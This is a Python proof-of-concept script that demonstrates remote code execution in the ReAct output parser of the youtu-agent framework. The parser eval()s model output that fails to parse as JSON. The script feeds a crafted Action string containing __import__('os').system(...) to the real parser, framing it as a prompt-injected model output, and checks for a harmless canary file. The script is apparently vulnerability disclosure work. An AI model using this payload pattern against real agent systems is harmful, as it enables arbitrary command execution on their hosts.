"""REAL-CODE PoC: executes the unmodified react_converter.py from TencentCloudADP/youtu-agent
(copied verbatim beside this file; sha256 printed below) and calls the real
ReactConverter._parse_react_output(). Heavy third-party imports are stubbed so the file loads
with no network; the vulnerable eval() line is the repo's own bytes. Benign canary only."""
import sys, types, os, hashlib, importlib.util

REAL = os.path.join(os.path.dirname(os.path.abspath(__file__)), "react_converter.py")
src = open(REAL, "rb").read()
print("sha256(react_converter.py):", hashlib.sha256(src).hexdigest())
assert b"action = eval(text_output)" in src, "eval sink not present in real source!"
print("confirmed: real source contains `action = eval(text_output)`\n")

def mod(n):
    m = types.ModuleType(n); sys.modules[n] = m; return m
class _Any:
    def __init__(self,*a,**k): pass
    def __call__(self,*a,**k): return _Any()
    def __getattr__(self,n): return _Any()
j = mod("jinja2")
class _Env:
    def from_string(self,*a,**k):
        class _T:
            def render(self,*a,**k): return ""
        return _T()
j.Environment = _Env
ag = mod("agents")
for n in ("AgentOutputSchema","Handoff","ModelSettings","Tool","TResponseInputItem"): setattr(ag,n,_Any)
mod("agents.models")
cc = mod("agents.models.chatcmpl_converter")
class Converter:
    @staticmethod
    def message_to_output_items(m): return ["<ResponseOutputItem stub>"]
cc.Converter = Converter
mod("openai"); mod("openai.types")
chat = mod("openai.types.chat")
class _KW:
    def __init__(self,**k): self.__dict__.update(k)
chat.ChatCompletionMessage = _KW; chat.ChatCompletionMessageToolCall = _KW
tc = mod("openai.types.chat.chat_completion_message_tool_call"); tc.Function = _KW
rp = mod("openai.types.responses")
for n in ("EasyInputMessageParam","ResponseOutputItem","ResponseOutputMessage"): setattr(rp,n,_Any)

spec = importlib.util.spec_from_file_location("real_rc", REAL)
m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)   # runs the REAL repo bytes

conv = m.ReactConverter()
canary = "/work/YT_CANARY_REAL"
if os.path.exists(canary): os.remove(canary)
# A prompt-injected / malicious model Action: invalid JSON (single quotes + call) -> json.loads
# fails -> eval() runs the os.system side effect BEFORE the name/arguments validation.
payload = ("Action:\n__import__('os').system('touch %s') or "
           "{'name':'search','arguments':{'q':'x'}}" % canary)
print("Action payload:\n  ", payload.replace("\n","\\n"), "\n")
print("canary before:", os.path.exists(canary))
out = conv._parse_react_output(payload)
print("canary after :", os.path.exists(canary))
print("parser returned:", out)
print("\nRESULT:", "RCE CONFIRMED — real ReactConverter._parse_react_output eval'd attacker code"
      if os.path.exists(canary) else "NO EXEC (bug not reproduced)")
